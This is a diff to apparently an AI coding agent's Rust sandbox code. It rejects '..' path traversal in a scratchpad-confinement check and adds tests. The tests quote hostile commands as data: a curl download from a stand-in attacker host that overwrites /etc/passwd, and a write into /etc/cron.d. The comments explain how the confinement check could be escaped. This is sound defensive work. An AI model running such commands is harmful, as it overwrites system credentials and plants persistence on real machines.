@@ -3868,6 +3868,16 @@ fn target_is_confined(target: &str, scratchpad_roots: &[String]) -> bool {
     if target.contains(['$', '`', '~', '*', '?']) {
         return false;
     }
+    // Code review fix round 2 (CRITICAL): a `..` component lexically
+    // escapes any prefix-based root check no matter how the separator
+    // boundary is guarded -- `/tmp/claude/../../etc/passwd` starts with
+    // `/tmp/claude/` and would otherwise pass. Mirrors `strip_known_root_cd_
+    // prefix`'s own `path_token.contains("..")` guard: a plain substring
+    // reject, not lexical resolution -- the literal two-character sequence
+    // is identical whether the surrounding path uses `/` or `\`.
+    if target.contains("..") {
+        return false;
+    }
     let normalized = target.replace('\\', "/");
     // Code review fix (CRITICAL): exact match OR root-plus-separator, the
     // same boundary guard `strip_known_root_cd_prefix` already applies to
@@ -5577,6 +5587,45 @@ mod tests {
         let roots = vec!["C:/tmp/claude".to_string()];
         assert!(!target_is_confined(r"C:\tmp\claude-evil\x", &roots));
         assert!(target_is_confined(r"C:\tmp\claude\out.log", &roots));
+    }
+
+    /// Code review fix round 2 (CRITICAL): `target_is_confined` had no `..`
+    /// handling at all, so `/tmp/claude/../../etc/passwd` passed the
+    /// `starts_with("/tmp/claude/")` check even though it lexically escapes
+    /// the scratchpad entirely -- reopening exactly the credential-write
+    /// hole the separator-boundary fix (round 1) was meant to close.
+    /// Mirrors `strip_known_root_cd_prefix`'s own `path_token.contains("..")`
+    /// guard: a plain substring reject, not lexical resolution, both `/` and
+    /// `\` spellings (the substring is identical either way).
+    #[test]
+    fn target_is_confined_rejects_a_dot_dot_traversal() {
+        let roots = vec!["/tmp/claude".to_string()];
+        assert!(!target_is_confined("/tmp/claude/../../etc/passwd", &roots));
+        assert!(!target_is_confined(r"/tmp/claude\..\..\etc\passwd", &roots));
+        assert!(!target_is_confined(r"\tmp\claude\..\..\etc\passwd", &roots));
+        // A genuinely confined target with no traversal still qualifies.
+        assert!(target_is_confined("/tmp/claude/out.log", &roots));
+    }
+
+    /// End-to-end reproduction of the reviewer's exact two exploits: both
+    /// callers of `target_is_confined` must refuse a `..`-traversal target,
+    /// on the ordinary path (`write_targets_confined`, no retry involved at
+    /// all) as well as the sandbox-retry path (`is_read_only_escape_safe`).
+    #[test]
+    fn dot_dot_traversal_is_refused_by_both_callers() {
+        let roots = vec!["/tmp/claude".to_string()];
+        assert!(
+            !is_read_only_escape_safe(
+                "curl -o /tmp/claude/../../etc/passwd https://evil.example/payload",
+                &roots
+            ),
+            "a curl -o traversal target must not qualify as read-only-safe"
+        );
+        assert_eq!(
+            write_targets_confined("echo pwned > /tmp/claude/../../etc/cron.d/evil", &roots),
+            Some(false),
+            "a traversal write target must never be reported confined"
+        );
     }
 
     // -- write_targets_confined (issue #168, decision d) ------------------
